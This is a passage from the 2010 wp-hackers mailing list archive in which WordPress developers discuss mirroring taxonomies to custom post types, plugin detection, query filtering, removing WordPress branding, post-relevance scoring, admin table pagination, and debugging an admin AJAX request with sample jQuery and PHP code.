Let me give an example.  Assume you have a "movie" custom post type and you want to add "actor" and "genre" taxonomies but also want "actor" and "genre" custom post types so that when you add an actor post record (i.e. "Brad Pitt" or "Angelina Jolie") you get corresponding "Brad Pitt" or "Angelina Jolie" taxonomy terms that link to their associated post type record. This will let you associate the "Brad Pitt" and/or "Angelina Jolie" post type records with each of the movie post type record for the movies they starred in by using the taxonomy selector metabox in the movie edit screen; it provides lots of functionality "for free."

As first I implemented the functionality via #1 because it was easiest but Michael Pretty pointed out[2] that using matching slugs is a bit too fragile and thus not recommended.

I implemented the functionality via #2 using a wp_postmeta->meta_key of "_mirrored_term_id" and storing the associated $wp_terms->term_id in $wp_postmeta->meta_value, and $wp_posts->ID in $wp_postmeta->post_id, of course.  This works nicely except it is yet another postmeta record and more importantly it uses a non-indexed longtext field to store what ideally would be an indexed bigint field.

The other option I considered was to use the $wp_term_taxomony->parent field to store the wp_posts->ID field for a given association. I could use that field because, for my use-case I'll never use that parent field which I assume was meant to be a foreign key back into the same table (or many to wp_terms->term_id, not sure.) This parent field *is* a bigint field and while not indexed and index could easily be added if performance becomes an issue. However, I'm concerned that some other plugin might overload the use of that field two and either clobber my use-case or my plugin might clobber theirs.  Or maybe someone already knows of a use-case that would make this either impractical or downright incorrect?

So I'd love to get feedback on this.  If you are implementing the same (or if you already have) which way would/did you choose to go, and why?

-- Option #2?
-- Option #3? 
-- Or some 4th choice I didn't consider? 

Thanks in advance.

-Mike

[1] http://lists.automattic.com/pipermail/wp-hackers/2010-July/032826.html
[2] http://lists.automattic.com/pipermail/wp-hackers/2010-May/032205.html

From andrew at graymerica.com  Mon Jul 26 23:19:45 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Mon, 26 Jul 2010 19:19:45 -0400
Subject: [wp-hackers] wp_cache function tutorials
Message-ID: <698E72D7-4FC6-4E16-A89A-E1053D6ACCB0@graymerica.com>

Sorry about my bad link,  here is the correct link for the sample code.

Make sure it does not get wrapped,

http://dl.dropbox.com/u/896473/cached-sidebar.php

or use

http://TinyURL.com/wordcamprdu



From wp-hackers at striderweb.com  Tue Jul 27 00:46:23 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 26 Jul 2010 19:46:23 -0500
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <AANLkTikyL8WUSKwgZ0uDQis+3f_sZcSSHgHBpVWG2Nft@mail.gmail.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
	<AANLkTikyL8WUSKwgZ0uDQis+3f_sZcSSHgHBpVWG2Nft@mail.gmail.com>
Message-ID: <FFDED394-8829-41B4-865F-7A784E2D9A3B@striderweb.com>

Is the "master" plugin yours or someone else's?  If you can add code to the master, I would add a do_action hook that loads sub-plugins, and an add_action to the sub-plugin that initializes the plugin.  Thus it initializes when the master plugin calls for its sub-plugins.

Stephen


-- 
Stephen Rider
http://striderweb.com/


From mpretty at voceconnect.com  Tue Jul 27 02:30:50 2010
From: mpretty at voceconnect.com (Michael Pretty)
Date: Mon, 26 Jul 2010 22:30:50 -0400
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
In-Reply-To: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>
References: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>
Message-ID: <4C4E44DA.6050003@voceconnect.com>

We have a couple more projects lined up where we need a many to many 
relationship between objects and have decided that for us the best 
option is to bite the bullet and create a new table.  Its something we 
usually leave as a last resort, but at this point, that seems like the 
best option because of the issues you mentioned.  I haven't yet worked 
out all the details of how it is going to work other than a table that 
stores parent_id, child_id and relationship_type, with lots of caching.  
At this point it just seems like it is going to be the only way to 
provide the many to many relationship that is both stable and provides 
decent performance.

Michael Pretty
prettyboymp

From mikeschinkel at newclarity.net  Tue Jul 27 02:44:40 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 22:44:40 -0400
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
In-Reply-To: <4C4E44DA.6050003@voceconnect.com>
References: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>
	<4C4E44DA.6050003@voceconnect.com>
Message-ID: <D4DD3770-0E3E-45C5-AB70-AD1C99F74DA2@newclarity.net>

On Jul 26, 2010, at 10:30 PM, Michael Pretty wrote:
> We have a couple more projects lined up where we need a many to many relationship between objects and have decided that for us the best option is to bite the bullet and create a new table.  Its something we usually leave as a last resort, but at this point, that seems like the best option because of the issues you mentioned.  I haven't yet worked out all the details of how it is going to work other than a table that stores parent_id, child_id and relationship_type, with lots of caching.  At this point it just seems like it is going to be the only way to provide the many to many relationship that is both stable and provides decent performance.

Really? Thanks for commenting, but that's disheartening to hear. Especially because I doubt a new table will be able to make its way into WP 3.x in the near future although an API layer for existing data structures seems more likely.

If you had to pick between the two problems you mentioned, which would you say is the more difficult to resolve using taxonomies mirroring posts; stability or performance?

-Mike

From mpretty at voceconnect.com  Tue Jul 27 03:06:06 2010
From: mpretty at voceconnect.com (Michael Pretty)
Date: Mon, 26 Jul 2010 23:06:06 -0400
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
In-Reply-To: <D4DD3770-0E3E-45C5-AB70-AD1C99F74DA2@newclarity.net>
References: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>	<4C4E44DA.6050003@voceconnect.com>
	<D4DD3770-0E3E-45C5-AB70-AD1C99F74DA2@newclarity.net>
Message-ID: <4C4E4D1E.20804@voceconnect.com>

For me, stability has been the most difficult problem to solve.  There 
are just too many things that can happen to make the link between the 
post and it's representative term invalid.  If one was deleted and the 
other didn't delete due to some failure, you would end up with an 
unpaired item floating around.  Also, since terms are shared across 
taxonomies, you could end up with a term name that doesn't correctly 
represent the item it's linked to, or changing the name of an item 
causing another taxonomy to have its term with an invalid name.

> If you had to pick between the two problems you mentioned, which would you say is the more difficult to resolve using taxonomies mirroring posts; stability or performance?
>
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    


From mikeschinkel at newclarity.net  Tue Jul 27 03:22:17 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 26 Jul 2010 23:22:17 -0400
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
In-Reply-To: <4C4E4D1E.20804@voceconnect.com>
References: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net>	<4C4E44DA.6050003@voceconnect.com>
	<D4DD3770-0E3E-45C5-AB70-AD1C99F74DA2@newclarity.net>
	<4C4E4D1E.20804@voceconnect.com>
Message-ID: <013AB90E-4B14-41C1-A191-065A1C728EA1@newclarity.net>

On Jul 26, 2010, at 11:06 PM, Michael Pretty wrote:
> For me, stability has been the most difficult problem to solve.  There are just too many things that can happen to make the link between the post and it's representative term invalid.  If one was deleted and the other didn't delete due to some failure, you would end up with an unpaired item floating around.  Also, since terms are shared across taxonomies, you could end up with a term name that doesn't correctly represent the item it's linked to, or changing the name of an item causing another taxonomy to have its term with an invalid name.

Interesting.  Thanks for explaining.  

This seems like a really important functionality to add, at least via plugins if not in core, now that we have custom post types, and it's very much inline with the type of things I work on.  I'd be happy to collaborate on it if you ever have interest.

-Mike



From lox.dev at knc.nc  Tue Jul 27 06:38:35 2010
From: lox.dev at knc.nc (Lox)
Date: Tue, 27 Jul 2010 17:38:35 +1100
Subject: [wp-hackers] Get nav menu items associted to a post for a specific
	menu
Message-ID: <AANLkTimyCfiwNE8ozk=NT5SVLZs1r+f_GWd0pWxd2gUo@mail.gmail.com>

Hello,

There is the wordpress function wp_get_associated_nav_menu_items
(http://gist.github.com/491844) but it returns associated menu items
from all menus. Menus are terms, how can I alter that wp_query:

 $query = new WP_Query;
$menu_items = $query->query(
array(
'meta_key' => '_menu_item_object_id',
'meta_value' => $object_id,
'post_status' => 'any',
'post_type' => 'nav_menu_item',
'showposts' => -1,
)
);

To include a term parameter?

-- 
Lox
lox.dev at knc.nc

From lox.dev at knc.nc  Tue Jul 27 07:02:29 2010
From: lox.dev at knc.nc (Lox)
Date: Tue, 27 Jul 2010 18:02:29 +1100
Subject: [wp-hackers] Taxonomy Mirrored Posts Best Practice?
In-Reply-To: <013AB90E-4B14-41C1-A191-065A1C728EA1@newclarity.net>
References: <A221F4FA-A08C-407F-B781-607E0D616F68@newclarity.net> 
	<4C4E44DA.6050003@voceconnect.com>
	<D4DD3770-0E3E-45C5-AB70-AD1C99F74DA2@newclarity.net> 
	<4C4E4D1E.20804@voceconnect.com>
	<013AB90E-4B14-41C1-A191-065A1C728EA1@newclarity.net>
Message-ID: <AANLkTi=ajcMoqbAwcLRP=mmVgX8+kVX_3XwOKnF=SYtK@mail.gmail.com>

I faced the same problem, so I made a custom post type "actors" and
then added a custom field to movies add/edit form witch is a select
box of all actors. It could be a list of checkboxes.

-
Lox
lox.dev at knc.nc

From wordpress at dd32.id.au  Tue Jul 27 07:26:09 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Tue, 27 Jul 2010 17:26:09 +1000
Subject: [wp-hackers] Applying a filter to the main loop only
In-Reply-To: <AANLkTi=e3=r=rcjaCEN=ZyGjeCNvQbqme4xTHZRxcEL4@mail.gmail.com>
References: <AANLkTikFOUvRbPMmkAtRPd-EVs2aLGNWrCSr69CDjN4O@mail.gmail.com>
	<AANLkTintv4U9VYUck4zxHOX51BcQgh_YAZn7V-o8=UaZ@mail.gmail.com>
	<73EB6839-5577-4A7C-9034-4955AD0C71BA@newclarity.net>
	<AANLkTi=8T_d+f2Gx5hbA-LaUwnND6+WJne2qGKMqN8Pc@mail.gmail.com>
	<AANLkTikNgR=dY4P9Q0zhb8Dp6yPsJpfNbmhxxrqZ=QET@mail.gmail.com>
	<AANLkTi=e3=r=rcjaCEN=ZyGjeCNvQbqme4xTHZRxcEL4@mail.gmail.com>
Message-ID: <op.vghqxutxspxmuu@ho.st>

On Tue, 27 Jul 2010 05:49:37 +1000, John Blackbourn  
<johnbillion+wp at gmail.com> wrote:

> On Mon, Jul 26, 2010 at 8:42 PM, Otto <otto at ottodestruct.com> wrote:
>> Hang on, I'm confused...
>>
>> You guys keep mentioning the main "loop", but then go on to talk about
>> modifying the query for it and such. But the main post SELECT query is
>> run and done before the template is ever called, certainly before you
>> ever get to any "loop". It helps determine what template is called, in
>> fact.
>
> That's true but I wanted a filter on the get_posts parameters, not on
> the SQL query itself.

Then as Andrew said initially here, Sounds like you want to use  
parse_request/etc that he's mentioned.

parse_request parses the Request, which is then handed over to WP_Query,  
Modify it at parse_request, modify the current page request before any  
queries are made; The "main" loop will utilise that.


Dion Hulse / dd32
Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From KrisY at tbs.uk.com  Tue Jul 27 08:14:16 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Tue, 27 Jul 2010 09:14:16 +0100
Subject: [wp-hackers] Rename wp-admin problems
In-Reply-To: <AANLkTinkzTUfw09wob6mbF5YQqowKouXS=GVjso4EWk5@mail.gmail.com>
References: <AANLkTi=uURhZc-s36LbOoksjcO5UqT37JiOdVxOpjiht@mail.gmail.com><AANLkTimSCAW4Ny=uxyPmMWNOhzSaWn-2NWyZumJjuDmB@mail.gmail.com><AANLkTinPe5qrgRpXpgdNE0xVO9_py4y3kC=PSiELc=Bk@mail.gmail.com><AANLkTimnDTb9zepG=GZXLRoC21Vfewur+_b-zuQYQZVx@mail.gmail.com><AANLkTi=yndQQnMNvKtXhR33-iy6RdvdYs2pFLLRPivPv@mail.gmail.com><AANLkTi=5GdsX2G3otzOU30g4tJLr2TJtvLNsd28BYWbA@mail.gmail.com><AANLkTin+pkm4a4BZm0eE2kmsD9qTPHBi0Q+6L57gKPAj@mail.gmail.com><AANLkTi=qD=WTpFS1FdDB5EmFgT5x2EUGdbJqvComJt7c@mail.gmail.com><AANLkTimPhKxKefNefzVOR4EijYkS9L+1reaohLp_Hj14@mail.gmail.com><AANLkTinuHp5Top423nzZA+H_HdVyH=gsCTLpDCkokrLm@mail.gmail.com><AANLkTik2EU1W349s6fHqJ7sou6Yg6jwZf4VYmW1c1LDW@mail.gmail.com><AANLkTimQLyTjB4QU91fKd559C03BNxDgWy-3hZX6tUMh@mail.gmail.com><AANLkTinvDxPsaBdv-DSKC9OF5=OvkOa4DDiAvjZk2_HV@mail.gmail.com>
	<AANLkTinkzTUfw09wob6mbF5YQqowKouXS=GVjso4EWk5@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E31B0@tbs-sbs01.TBS.local>

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of WP
Customizer
Sent: 26 July 2010 18:45
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Rename wp-admin problems

Sorry if I didn't make that clear, that part of my comment was directed
towards everyone else.

-----

That's fine and all, but what exactly ARE you doing? I really see no
reason why you would want to remove any of the WordPress branding (in
URL's or otherwise) unless you were intending to pass it off as your
own. Whether you like it or not, creating this thread has opened up
speculation as to what your intentions are (from multiple people, too) -
you have to accept and address that, or not post in the first place.

I guess what my question is, why is it causing any harm by having 'wp-'
in some of your filenames? 

To those that said having WordPress 'in' your site in some way dilutes
your company brand - I disagree. If anything, it opens up new avenues
for people to appreciate the fact you've taken an out-of-the-box
software and modified it for your specific needs. Not myself personally,
but a company I used to work for had a knack for a similarly-popular
.NET solution. They didn't make a secret about the fact the site was
using this software, modified it heavily, and earned a handful of very
good clients out of it. In the end, these clients were using a software
that was fully supported and regularly maintained by the original CMS
developer team, as well as given opportunities to keep improving it by
us. There is no downside to this.

From wp-hackers at striderweb.com  Tue Jul 27 13:05:40 2010
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Tue, 27 Jul 2010 08:05:40 -0500
Subject: [wp-hackers] 'Scoring system' to show more relevant posts?
In-Reply-To: <AANLkTikmkHPB_eAhbbX7ChHHl1P_tRwOnf1lD1iqCh-j@mail.gmail.com>
References: <AANLkTikmkHPB_eAhbbX7ChHHl1P_tRwOnf1lD1iqCh-j@mail.gmail.com>
Message-ID: <340A7340-5BD9-44CC-B6F9-2A9265AA468C@striderweb.com>

Alex --

If you haven't yet done much work on this, it almost sounds to me as though you could adapt the Spam Karma plugin to do what you describe.

Spam Karma runs comments through a series of filters that each apply a score to the comment.  -7 if the browser doesn't read JavaScript; +5 if the commenter has commented in the past; and so forth.

You could do similar for your system, but apply it to posts.

Stephen

On Jul 2, 2010, at 10:07 AM, Alex Hempton-Smith wrote:

> Hi all,
> 
> Putting this out there to see whether others have worked on something
> similar, and any tips you might have.
> 
> I'm working on a news website, online newspaper type thing, that I'd like to
> make more relevant for users. The homepage will be just like a newspaper
> frontpage, but dynamically generated based on what is popular and relevant
> to the user (if logged in).
> 
> I thought I could basically work out a scoring system, that gives each post
> a 'score' based on different criteria:
> 
> Popularity (how many views and/or stars)
> Timestamp (latest posts have a higher score)
> Interests (I'll have an array of the users interests and if the posts
> tags/cats match one or more, it gets a higher score)
> Location (the logged in user will provide a postcode, if the post is in
> their region it gets bumped)
> 
> etc etc.
> 
> My only issue is making this happen on the homepage, do I just 'foreach'
> through the latest posts and then generate the homepage based on that? Thats
> resource intensive though...
> 
> What are your thoughts on making homepages more relevant to users? If I can
> package this up, I'll release it as a plugin later on.
> 
> -- Alex  (Hempsworth)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From johnbillion+wp at gmail.com  Tue Jul 27 13:15:07 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Tue, 27 Jul 2010 14:15:07 +0100
Subject: [wp-hackers] 'Scoring system' to show more relevant posts?
In-Reply-To: <340A7340-5BD9-44CC-B6F9-2A9265AA468C@striderweb.com>
References: <AANLkTikmkHPB_eAhbbX7ChHHl1P_tRwOnf1lD1iqCh-j@mail.gmail.com>
	<340A7340-5BD9-44CC-B6F9-2A9265AA468C@striderweb.com>
Message-ID: <AANLkTim05VP_uFrTCGnuhLpry5jwQ5T8YrtxhWERFaHC@mail.gmail.com>

Might also be worth looking at Yet Another Related Posts Plugin as it
has some nifty code in it for calculating related posts. You could
adapt it to show posts relevant to the users' listed interests.

On Tue, Jul 27, 2010 at 2:05 PM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> Alex --
>
> If you haven't yet done much work on this, it almost sounds to me as though you could adapt the Spam Karma plugin to do what you describe.
>
> Spam Karma runs comments through a series of filters that each apply a score to the comment. ?-7 if the browser doesn't read JavaScript; +5 if the commenter has commented in the past; and so forth.
>
> You could do similar for your system, but apply it to posts.
>
> Stephen
>
> On Jul 2, 2010, at 10:07 AM, Alex Hempton-Smith wrote:
>
>> Hi all,
>>
>> Putting this out there to see whether others have worked on something
>> similar, and any tips you might have.
>>
>> I'm working on a news website, online newspaper type thing, that I'd like to
>> make more relevant for users. The homepage will be just like a newspaper
>> frontpage, but dynamically generated based on what is popular and relevant
>> to the user (if logged in).
>>
>> I thought I could basically work out a scoring system, that gives each post
>> a 'score' based on different criteria:
>>
>> Popularity (how many views and/or stars)
>> Timestamp (latest posts have a higher score)
>> Interests (I'll have an array of the users interests and if the posts
>> tags/cats match one or more, it gets a higher score)
>> Location (the logged in user will provide a postcode, if the post is in
>> their region it gets bumped)
>>
>> etc etc.
>>
>> My only issue is making this happen on the homepage, do I just 'foreach'
>> through the latest posts and then generate the homepage based on that? Thats
>> resource intensive though...
>>
>> What are your thoughts on making homepages more relevant to users? If I can
>> package this up, I'll release it as a plugin later on.
>>
>> -- Alex ?(Hempsworth)
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jgadbois at gmail.com  Tue Jul 27 14:21:27 2010
From: jgadbois at gmail.com (John Gadbois)
Date: Tue, 27 Jul 2010 10:21:27 -0400
Subject: [wp-hackers] API for outputting paginated table in admin section
Message-ID: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>

Is there a wordpress API (maybe similar to the Settings API) to output a
paginated table in the Admin section?

From cross at thisismyurl.com  Tue Jul 27 14:43:49 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Tue, 27 Jul 2010 11:43:49 -0300
Subject: [wp-hackers] Checking if a plugin exists
In-Reply-To: <FFDED394-8829-41B4-865F-7A784E2D9A3B@striderweb.com>
References: <E0FC8474-0645-4057-B177-35131F3C2BA3@thisismyurl.com>
	<AANLkTikyL8WUSKwgZ0uDQis+3f_sZcSSHgHBpVWG2Nft@mail.gmail.com>
	<FFDED394-8829-41B4-865F-7A784E2D9A3B@striderweb.com>
Message-ID: <65E63E34-3BED-4EB4-B5C2-34CD5F0FF047@thisismyurl.com>

Hi Stephen, nope the master plugin is from somebody else. Ashish's code worked great.

Chris


On 2010-07-26, at 9:46 PM, Stephen Rider wrote:

> Is the "master" plugin yours or someone else's?  If you can add code to the master, I would add a do_action hook that loads sub-plugins, and an add_action to the sub-plugin that initializes the plugin.  Thus it initializes when the master plugin calls for its sub-plugins.
> 
> Stephen
> 
> 
> -- 
> Stephen Rider
> http://striderweb.com/
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708
New Orleans 1 (504) 322 3485

http://christopherross.ca
http://www.thisismyurl.com


From otto at ottodestruct.com  Tue Jul 27 15:06:22 2010
From: otto at ottodestruct.com (Otto)
Date: Tue, 27 Jul 2010 10:06:22 -0500
Subject: [wp-hackers] API for outputting paginated table in admin section
In-Reply-To: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
References: <AANLkTinAybOdx1TQsJ4KeHZRbmE8x6RsRUyYxXakkvTn@mail.gmail.com>
Message-ID: <AANLkTikXvGicam6-go8o0bbM7mraXfDAfr0xf032Ly9q@mail.gmail.com>

Not as such, no. There's a few helper functions like paginate_links,
but each panel that does this basically does it itself.

Look at the edit-comments.php for an example.

-Otto



On Tue, Jul 27, 2010 at 9:21 AM, John Gadbois <jgadbois at gmail.com> wrote:
> Is there a wordpress API (maybe similar to the Settings API) to output a
> paginated table in the Admin section?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jgadbois at gmail.com  Tue Jul 27 15:24:12 2010
From: jgadbois at gmail.com (John Gadbois)
Date: Tue, 27 Jul 2010 11:24:12 -0400
Subject: [wp-hackers] AJAX from wp-admin/edit.php
Message-ID: <AANLkTi=zFh-Gu_s=+qvBVUcqMS3P6ZD22_9FrRxNGPoo@mail.gmail.com>

I'm attempting to do an AJAX call from wp-admin/edit.php (I added a link
after Quick Edit, through the post_row_actions filter for a plugin).  For
some reason it's not working.  I've verified in Chrome developer tools that
the request is getting sent to the correct URL, but I'm not getting any
response at all from the server.  I even put a debug line and die() at the
top of admin-ajax.php and it didn't return a response.  I've set up AJAX
successfully on other pages specific to my plugin in the admin section.

I'm posting using ajaxurl, so it isn't a typo or anything like that.

Any ideas?

From paul at codehooligans.com  Tue Jul 27 15:39:39 2010
From: paul at codehooligans.com (Paul)
Date: Tue, 27 Jul 2010 11:39:39 -0400
Subject: [wp-hackers] AJAX from wp-admin/edit.php
In-Reply-To: <AANLkTi=zFh-Gu_s=+qvBVUcqMS3P6ZD22_9FrRxNGPoo@mail.gmail.com>
References: <AANLkTi=zFh-Gu_s=+qvBVUcqMS3P6ZD22_9FrRxNGPoo@mail.gmail.com>
Message-ID: <1A547F88-D86F-4339-B733-F8DFCDC9B918@codehooligans.com>

Ok. I'll bite. Smells like a support request but here it goes. I just implemented this on a custom plugin. So feeling I might be qualified to answer. But no promises. Some questions. 

1. You added the link. Ok, how are you capturing the click event? Assumed some jQuery or whatever. Have you checked to make sure this is getting properly captured and processed?

2. Also, via your client event processing you are calling the method to post to the server something similar to the examples described http://codex.wordpress.org/AJAX_in_Plugins

2b. You mentioned adding debug to admin-ajax.php. Are you using Firefox + Firebug? You should at least be able to see the post of your message to the server. Anything?

3. How about some code to review?

P-


On Jul 27, 2010, at 11:24 AM, John Gadbois wrote:

> I'm attempting to do an AJAX call from wp-admin/edit.php (I added a link
> after Quick Edit, through the post_row_actions filter for a plugin).  For
> some reason it's not working.  I've verified in Chrome developer tools that
> the request is getting sent to the correct URL, but I'm not getting any
> response at all from the server.  I even put a debug line and die() at the
> top of admin-ajax.php and it didn't return a response.  I've set up AJAX
> successfully on other pages specific to my plugin in the admin section.
> 
> I'm posting using ajaxurl, so it isn't a typo or anything like that.
> 
> Any ideas?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jgadbois at gmail.com  Tue Jul 27 15:50:08 2010
From: jgadbois at gmail.com (John Gadbois)
Date: Tue, 27 Jul 2010 11:50:08 -0400
Subject: [wp-hackers] AJAX from wp-admin/edit.php
In-Reply-To: <1A547F88-D86F-4339-B733-F8DFCDC9B918@codehooligans.com>
References: <AANLkTi=zFh-Gu_s=+qvBVUcqMS3P6ZD22_9FrRxNGPoo@mail.gmail.com> 
	<1A547F88-D86F-4339-B733-F8DFCDC9B918@codehooligans.com>
Message-ID: <AANLkTike-iQqhu0F0nm22tg66m2V5Uj8FnPuM=Ea7h7Q@mail.gmail.com>

1.  I'm capturing via with jQuery.  The post is going out as I can see it in
Chrome and I also get an empty alert(). Below are my headers...

   1.
   2. Request URL:
   http://www.versailles.com/wp-admin/admin-ajax.php
   3. Request Headers
      1. Accept:
      */*
      2. Cache-Control:
      max-age=0
      3. Content-Type:
      application/x-www-form-urlencoded
      4. Origin:
      http://www.versailles.com
      5. Referer:
      http://www.versailles.com/wp-admin/edit.php
      6. User-Agent:
      Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4
      (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
      7. X-Requested-With:
      XMLHttpRequest
      4. Form Data
      1. action:
      check_copyscape
      2. id:
      post-623


As you can see there is no status code or request type being sent (no 404,
200 OK, or anything).

2.  I'm posting according to the recommended approach and the same way I've
done before successfully.

3. Here's the code...

<?php
add_action('admin_head', 'copyscape_javascript');

function copyscape_javascript() {
?>
<script type="text/javascript" >
jQuery(document).ready(function($) {
   $('.checkCopyscape').live('click', function() {
      var row = $(this).closest("tr");

      var data = {
         action: 'check_copyscape',
         rowId: row.attr('id')
      };

      jQuery.post(ajaxurl, data, function(response) {
         alert(response);
         if(response)
         {
            row.data('oldHtml', row.html());
            row.html(response);
            row.addClass('inline-edit-row');
         }
         else
         {

         }
      });
   });
});
</script>
<?php
}

 add_action('wp_ajax_check_copyscape', 'copyscape_ajax_check');

function copyscape_ajax_check()
{
   echo "IN HERE";
   die();
}
?>

On another plugin I'm working on that works the headers are different...


   1. Request URL:
   http://www.versailles.com/wp-admin/admin-ajax.php
   2. Request Method:
   POST
   3. Status Code:
   200 OK
   4. Request Headers
      1. Accept:
      */*
      2. Content-Type:
      application/x-www-form-urlencoded
      3. Origin:
      http://www.versailles.com
      4. Referer:

      http://www.versailles.com/wp-admin/admin.php?page=textbroker_completed_orders
      5. User-Agent:
      Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4
      (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
      6. X-Requested-With:
      XMLHttpRequest
      5. Form Data
      1. action:
      text_broker_view_order
      2. order_id:
      580986
      6. Response Headers
      1. Cache-Control:
      no-cache, must-revalidate
      2. Connection:
      Keep-Alive
      3. Content-Type:
      text/html; charset=UTF-8
      4. Date:
      Tue, 27 Jul 2010 15:46:46 GMT
      5. Expires:
      Sat, 26 Jul 1997 05:00:00 GMT
      6. Keep-Alive:
      timeout=5, max=100
      7. Server:
      Apache/2.2.15 (Unix) mod_ssl/2.2.15 OpenSSL/0.9.8m DAV/2
      mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635
      8. Transfer-Encoding:
       chunked
      9. X-Powered-By:
      PHP/5.2.13



On Tue, Jul 27, 2010 at 11:39 AM, Paul <paul at codehooligans.com> wrote:

> Ok. I'll bite. Smells like a support request but here it goes. I just
> implemented this on a custom plugin. So feeling I might be qualified to
> answer. But no promises. Some questions.
>
> 1. You added the link. Ok, how are you capturing the click event? Assumed
> some jQuery or whatever. Have you checked to make sure this is getting
> properly captured and processed?
>
> 2. Also, via your client event processing you are calling the method to
> post to the server something similar to the examples described
> http://codex.wordpress.org/AJAX_in_Plugins
>
> 2b. You mentioned adding debug to admin-ajax.php. Are you using Firefox +
> Firebug? You should at least be able to see the post of your message to the
> server. Anything?
>
> 3. How about some code to review?
>
> P-
>
>
> On Jul 27, 2010, at 11:24 AM, John Gadbois wrote:
>
> > I'm attempting to do an AJAX call from wp-admin/edit.php (I added a link
> > after Quick Edit, through the post_row_actions filter for a plugin).  For
> > some reason it's not working.  I've verified in Chrome developer tools
> that
> > the request is getting sent to the correct URL, but I'm not getting any
> > response at all from the server.  I even put a debug line and die() at
> the
> > top of admin-ajax.php and it didn't return a response.  I've set up AJAX
> > successfully on other pages specific to my plugin in the admin section.
> >
> > I'm posting using ajaxurl, so it isn't a typo or anything like that.
> >
> > Any ideas?
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jgadbois at gmail.com  Tue Jul 27 16:05:53 2010
From: jgadbois at gmail.com (John Gadbois)
Date: Tue, 27 Jul 2010 12:05:53 -0400
Subject: [wp-hackers] AJAX from wp-admin/edit.php
In-Reply-To: <AANLkTike-iQqhu0F0nm22tg66m2V5Uj8FnPuM=Ea7h7Q@mail.gmail.com>
References: <AANLkTi=zFh-Gu_s=+qvBVUcqMS3P6ZD22_9FrRxNGPoo@mail.gmail.com> 
	<1A547F88-D86F-4339-B733-F8DFCDC9B918@codehooligans.com>
	<AANLkTike-iQqhu0F0nm22tg66m2V5Uj8FnPuM=Ea7h7Q@mail.gmail.com>
Message-ID: <AANLkTikY17FPZ7AjKH3qPYQ8SRsSHvj-ynyy8RUmvWnh@mail.gmail.com>

Sorry to bug everyone.  The href of my anchor was href='javascript:' and for
some reason that was breaking it unless I did an event.preventDefault().

On Tue, Jul 27, 2010 at 11:50 AM, John Gadbois <jgadbois at gmail.com> wrote:

> 1.  I'm capturing via with jQuery.  The post is going out as I can see it
> in Chrome and I also get an empty alert(). Below are my headers...
>
>    1.
>    2. Request URL:
>    http://www.versailles.com/wp-admin/admin-ajax.php
>    3. Request Headers
>       1. Accept:
>       */*
>       2. Cache-Control:
>       max-age=0
>       3. Content-Type:
>       application/x-www-form-urlencoded
>       4. Origin:
>       http://www.versailles.com
>       5. Referer:
>       http://www.versailles.com/wp-admin/edit.php
>       6. User-Agent:
>       Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.4
>       (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
>       7. X-Requested-With:
>       XMLHttpRequest
>       4. Form Data
>       1. action:
>       check_copyscape
>       2. id:
>       post-623
>
>
> As you can see there is no status code or request type being sent (no 404,
> 200 OK, or anything).
>
